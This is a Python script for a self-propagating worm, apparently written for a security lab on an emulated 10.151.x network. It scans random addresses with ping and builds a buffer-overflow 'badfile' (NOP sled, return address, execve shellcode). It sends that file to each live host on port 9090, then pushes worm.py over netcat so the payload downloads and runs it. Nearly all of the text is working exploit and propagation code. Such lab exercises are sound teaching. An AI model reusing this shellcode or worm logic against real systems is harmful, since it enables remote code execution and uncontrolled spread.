#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint
from random import random


number_X = randint(151, 155)
number_Y = randint(70, 80)

print(number_X)
print(number_Y)

def create_address():
   number_X = randint(151, 155)
   number_Y = randint(70, 80)
   address =  "10."+str(number_X)+".0."+str(number_Y)
   return address

def test_machine():
   ipaddr = create_address()
   #ipaddr = '10.151.0.71'
   check=0
   print(ipaddr)
   while True:
      while(check == 0):
         try:
            output = subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
            check=1   
         except:
            print("node not found ")
            ipaddr = create_address()
      check=0
      result = output.find(b'1 received')
      if result == -1:
         print(f"{ipaddr} is not alive", flush=True)
         ipaddr = create_address()
      else:
         print(f"*** {ipaddr} is alive, launch the attack", flush=True)
         return ipaddr



# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo 'Shellcode is running';if [ ! -f worm.py ]; then      "
   " nc -lnv 8000 > worm.py; python3 worm.py; fi;               "
   " ping 1.2.3.4;                                             *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd5f8 + 0x24  # hex 24 added for debugger
   offset = 116  # decimal value of ((0xffffd5f8 - 0xffffd588) + 4 )

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   return test_machine()


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.


# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(1)
    subprocess.run([f"cat worm.py | nc -w3 {targetIP} 8000"], shell=True)


    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    exit(0)
